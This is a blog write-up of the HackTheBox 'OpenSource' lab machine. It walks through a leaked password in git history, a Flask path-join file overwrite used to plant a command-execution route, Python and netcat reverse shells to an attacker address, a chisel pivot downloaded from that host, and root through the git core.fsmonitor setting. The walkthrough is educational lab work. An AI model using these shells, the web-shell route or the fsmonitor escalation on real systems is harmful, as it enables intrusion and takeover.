---
layout: post
title: "HTB: OpenSource"
box: opensource
img: /img/opensource/opensource
author: Andrew Cherney
date: 2024-08-14
tags: htb easy-box linux webapp git flask python cve command-injection
icon: "assets/icons/opensource.png"
post_description: "One of the last old boxes I needed to get around to rehacking and posting. Starts off simple with downloading an open source cloud service into using git logs to reveal a dev password. Then the contents can be examined to determine a vulnerability within the view.py file which allows the overwriting of any file within the webapp. After adding your own route RCE is achieved and shortly after a shell. To obtain root it is as simple as adding a variable to the git config file and running arbitrary commands."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -p- 10.10.11.164 -Pn

PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp


nmap -p22,80,3000 -sCV 10.10.11.164 -Pn

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Tue, 13 Aug 2024 23:36:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Tue, 13 Aug 2024 23:36:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
```

## Port 80

```bash
dirsearch -u http://10.10.11.164/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Misc/OpenSource/reports/http_10.10.11.164/__24-08-13_18-29-31.txt

Target: http://10.10.11.164/

[18:29:31] Starting: 
[18:30:13] 200 -    2KB - /console
[18:30:23] 200 -    2MB - /download
[18:31:13] 500 -   15KB - /uploads/dump.sql
[18:31:13] 500 -   16KB - /uploads/affwp-debug.log
```

{% include img_link src="/img/opensource/opensource_front_page" alt="front_page" ext="png" trunc=400 %}

![upcloud upload page]({{ page.img }}_upload.png)

A front page advertising a product then offering a demo locally on the site. This is a sure-fire way to get hacked if there are any vulnerabilities within whatever solution being offered. I download the zip file and check around.

```bash
ls -al source
total 28
drwxr-xr-x 5 raccoon lpadmin 4096 Oct 16  2022 .
drwxr-xr-x 5 raccoon lpadmin 4096 Aug 13  2024 ..
drwxr-xr-x 2 raccoon lpadmin 4096 Oct 16  2022 app
-rw-r--r-- 1 raccoon lpadmin  110 Sep 14  2022 build-docker.sh
drwxr-xr-x 2 raccoon lpadmin 4096 Oct 16  2022 config
-rw-r--r-- 1 raccoon lpadmin  574 Sep 14  2022 Dockerfile
drwxr-xr-x 2 raccoon lpadmin 4096 Oct 16  2022 .git
```

```bash
cat source/*

cat: source/app: Is a directory
#!/bin/bash
docker rm -f upcloud
docker build --tag=upcloud .
docker run -p 80:80 --rm --name=upcloud upcloud
cat: source/config: Is a directory
FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache supervisor

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY app .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 80

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Set mode
ENV MODE="PRODUCTION"

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```


# User as dev01

## Shell as docker root

### git log

This application is using flask and comes with a .git file. I can enumerate this for previous commits and alternate branches. Typically when offering a product download you don't send it with .git as this is a classic way to leak secrets or other misconfigurations.

```bash
git log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

This is the public branch, but with only 2 commits something tells me there is another branch that this came from.

```bash
git branch -a
  dev
* public
* 
git log dev
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
git show be4da71987bbbc8fae7c961fb2de01ebd0be1997
commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..e50a290
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1,26 @@
+.DS_Store
+.env
+.flaskenv
+*.pyc
+*.pyo
+env/
+venv/
+.venv/
+env*
+dist/
+build/
+*.egg
+*.egg-info/
+_mailinglist
+.tox/
+.cache/
+.pytest_cache/
+.idea/
+docs/_build/
+.vscode
+
+# Coverage reports
+htmlcov/
+.coverage
+.coverage.*
+*,cover
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
deleted file mode 100644
index 5975e3f..0000000
--- a/app/.vscode/settings.json
+++ /dev/null
@@ -1,5 +0,0 @@
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```

This password is only step 1 to obtaining root, we have 2 more steps to go. Next given that we know this is a flask application we can read the python source that defines the routes views.py

```python
cat app/app/views.py
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

### Rewriting views.py

It might be easy to overlook but there is a vulnerability here that can be exploited within the upload_file function. [Hacktricks of course has more info on it.](https://book.hacktricks.xyz/pentesting-web/file-inclusion#python-root-element) By using os.path.join within python it allows me to define an absolute path and overwrite the directories defined beforehand, meaning I can write to any file given it exists within / respective to the webapp (probably /var/www/public).

I first try a shell to see if it is in fact that easy.

```
POST /upcloud HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------49310446973920412135007932
Content-Length: 247
Origin: http://10.10.11.164
DNT: 1
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1

-----------------------------49310446973920412135007932
Content-Disposition: form-data; name="file"; filename="/shell.py"
Content-Type: application/octet-stream

import socket,os,pty;s=socket.socket();s.connect((os.getenv("10.10.14.4"),int(os.getenv("7777"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")

-----------------------------49310446973920412135007932--
```


{% include img_link src="/img/opensource/opensource_upload_error" alt="shell upload fail" ext="png" trunc=300 %}

That is a gnarly error. I decided to turn to what I do know about the box. We can write to any file, meaning I can define my own routes, meaning I can make my own route to code execution. I use ChatGPT here to define me a generic html template to render and a new route of /raccoon. Below are the parts that need to be added to views.py.

```python
from flask import render_template_string

html_template = """ <!DOCTYPE html> <html> <head> <title>Run Command</title> </head> <body> <h1>Enter Command</h1> <form method="post"> <input type="text" name="command" /> <input type="submit" value="Run" /> </form> {% if output %} <h2>Output:</h2> <pre>{{ output }}</pre> {% endif %} </body> </html> """

@app.route('/raccoon', methods=['GET', 'POST']) 
def run_command(): 
	output = None 
	if request.method == 'POST': 
		command = request.form.get('command') 
		if command: 
			output = os.popen(command).read()
	return render_template_string(html_template, output=output)
```

Upload at the /upcloud endpoint, then head to http://10.10.11.164/raccoon and run id to check the user running this webapp.

![/raccoon route upload]({{ page.img }}_raccoon_take_2.png)

Unexpected.. time to get a shell and dig around.

```bash
# Command run:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.4 7777 >/tmp/f


nc -nvlp 7777

Listening on 0.0.0.0 7777
Connection received on 10.10.11.164 43457
sh: can't access tty; job control turned off
/app # ls
INSTALL.md
app
public
run.py
/app # find / -name "id_rsa" 2>/dev/null
/app # netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      7/python
netstat: /proc/net/tcp6: No such file or directory
netstat: /proc/net/udp6: No such file or directory
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:06  
          inet addr:172.17.0.6  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:834 errors:0 dropped:0 overruns:0 frame:0
          TX packets:767 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:108080 (105.5 KiB)  TX bytes:275315 (268.8 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

/app # ping 172.17.0.1
PING 172.17.0.1 (172.17.0.1): 56 data bytes
64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.089 ms
64 bytes from 172.17.0.1: seq=1 ttl=64 time=0.106 ms
```

## Docker Escape

### Port Forwarding

That IP address I pinged is the default host for docker networks. We know from the initial nmap scan that port 3000 is open in some regard, perhaps this container is allowed to access it. 

```bash
/app # wget http://172.17.0.1:3000
Connecting to 172.17.0.1:3000 (172.17.0.1:3000)
saving to 'index.html'
index.html           100% |********************************| 13414  0:00:00 ETA
'index.html' saved
/app # cat index.html | grep Gitea
	<title> Gitea: Git with a cup of tea</title>
	<meta name="author" content="Gitea - Git with a cup of tea" />
	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
	<meta property="og:title" content="Gitea: Git with a cup of tea">
	<meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
<meta property="og:site_name" content="Gitea: Git with a cup of tea" />
					Gitea: Git with a cup of tea
				Gitea runs anywhere <a target="_blank" rel="noopener noreferrer nofollow" href="http://golang.org/">Go</a> can compile for: Windows, macOS, Linux, ARM, etc. Choose the one you love!
				Gitea has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!
			Powered by Gitea Version: 1.16.6 Page: <strong>7ms</strong> Template: <strong>4ms</strong>
```

There is a Gitea instance being run locally which I can access. If I had an SSH sessions I could SSH tunnel to access port 3000. Given I have a crude shell I need to find another way to access this resource.

My tool for choice in these cases is chisel, a port forwarder. It will allow me to setup a server client relationship that will forward traffic from a port I want locally to a port I want on the remote machine. The steps are simple, on the docker container run:

```bash
/app # wget http://10.10.14.4:8081/chisel_1.10.0_linux_amd64
/app # ./chisel_1.10.0_linux_amd64 client 10.10.14.4:4444 R:3000:172.17.0.1:3000
2024/08/14 02:09:49 client: Connecting to ws://10.10.14.4:4444
2024/08/14 02:09:49 client: Connected (Latency 74.73204ms)
```

And on your device run:

```bash
./chisel_1.10.0_linux_amd64 server -p 4444 --reverse

2024/08/13 20:41:14 server: Reverse tunnelling enabled
2024/08/13 20:41:14 server: Fingerprint IDk/AtlfBYtDbQML7r3vExlir1cRC34z1xgq7qqrmBc=
2024/08/13 20:41:14 server: Listening on http://0.0.0.0:4444
2024/08/13 20:41:36 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```

The anatomy of this command is the specified port on your LHOST is the port for the server-client model to communicate over, pick a port you intend not to scan or interact with as it will conflict. The remote host formatting is the same as SSH tunnelling, as in local_port:dest_addr:dest_port. 

With all this finally setup I can access the Gitea service from my local machine.

{% include img_link src="/img/opensource/opensource_gitea" alt="Gitea front page" ext="png" trunc=300 %}


### Gitea secrets

Remembering back to the dev branch that leaked the dev01's password we log into this service with `dev01:Soulless_Developer#2022`

![dev01 repos]({{ page.img }}_dev01_home.png)

![dev01 home directory Gitea]({{ page.img }}_home_directory.png)

A copy paste of dev01's home directory. There is an SSH key in here so I get a free session.

```bash
ssh -i id_rsa dev01@10.10.11.164

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 14 02:15:08 UTC 2024

  System load:  0.06              Processes:              238
  Usage of /:   75.6% of 3.48GB   Users logged in:        0
  Memory usage: 24%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ cat user.txt
25bff60cb5076f------------------
```

# Root

## CVE-2022-24765

Digging around the only minor lead I could find was with pspy, running an unfamiliar script.

```bash
./pspy64

2024/08/14 02:25:01 CMD: UID=0     PID=27989  | /bin/bash /usr/local/bin/git-sync 
2024/08/14 02:25:01 CMD: UID=0     PID=27991  | /bin/bash /usr/local/bin/git-sync 
2024/08/14 02:25:01 CMD: UID=0     PID=27992  | git commit -m Backup for 2024-08-14 
2024/08/14 02:25:01 CMD: UID=0     PID=27993  | /bin/bash /usr/local/bin/git-sync 
2024/08/14 02:25:01 CMD: UID=0     PID=27994  | git push origin main 
```

```bash
dev01@opensource:~$ ls -al /usr/local/bin/git-sync
-rwxr-xr-x 1 root root 239 Mar 23  2022 /usr/local/bin/git-sync
dev01@opensource:~$ file /usr/local/bin/git-sync
/usr/local/bin/git-sync: Bourne-Again shell script, ASCII text executable
dev01@opensource:~$ cat /usr/local/bin/git-sync 
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

Though I may not have the permissions to edit the git-sync file I can edit everything in dev01's home directory, the location the bash script changes to then runs the git push for the Gitea service. First I attempt to make a symbolic link to root resources to see if the Gitea repo will update. 

```bash
dev01@opensource:~$ ln -s /root/.ssh/id_rsa root_key
dev01@opensource:~$ ln -s /root/root.txt root_flag

ssh -i id_rsa dev01@10.10.11.164 -L 3000:127.0.0.1:3000
```

The answer is it didn't but in concept I believe this might have uploaded those resources to the repo indiscriminately. This is a general PSA that git should not be run by root as there is not a reason for git to need access to things users cannot do (same for pip).

I took some time on the drawing board thinking about what I had access to here. The only real file that would constitute some "control" over the commands within .git is the config file. 

```
dev01@opensource:~$ cat .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://opensource.htb:3000/dev01/home-backup.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Another consideration to me was the box was released in 2022 so searching for git vulnerabilities within that year might be worthwhile. The "git vulnerability 2022" search did the trick after scrolling a bit to find [this post about fsmonitor running commands](https://github.blog/open-source/git/git-security-vulnerability-announced/).

[From the git-config documentation for verison 2.35.2](https://git-scm.com/docs/git-config/2.35.2#Documentation/git-config.txt-corefsmonitor):

```
core.fsmonitor

If set, the value of this variable is used as a command which will identify all files that may have changed since the requested date/time. This information is used to speed up git by avoiding unnecessary processing of files that have not changed. See the "fsmonitor-watchman" section of [githooks[5]](https://git-scm.com/docs/githooks).
```

I test this vuln by adding fsmonitor and having it create a file in /tmp

```bash
dev01@opensource:~$ cat .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	fsmonitor = "touch /tmp/fsmonitor"
[remote "origin"]
	url = http://opensource.htb:3000/dev01/home-backup.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
dev01@opensource:~$ ls /tmp
fsmonitor
snap.docker
systemd-private-46f86691781f43539d1d445c40d06bd1-systemd-resolved.service-mRGDu2
systemd-private-46f86691781f43539d1d445c40d06bd1-systemd-timesyncd.service-qWaslc
vmware-root_907-4021784429
```

We are a go, change to a simple bash SUID maker and get root.

```bash
# Add to .git/config
fsmonitor = "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash"

dev01@opensource:~$ ls /tmp
bash         systemd-private-46f86691781f43539d1d445c40d06bd1-systemd-resolved.service-mRGDu2
fsmonitor    systemd-private-46f86691781f43539d1d445c40d06bd1-systemd-timesyncd.service-qWaslc
snap.docker  vmware-root_907-4021784429
dev01@opensource:~$ /tmp/bash -p
bash-4.4# cat /root/root.txt
a037e12667015-------------------
```


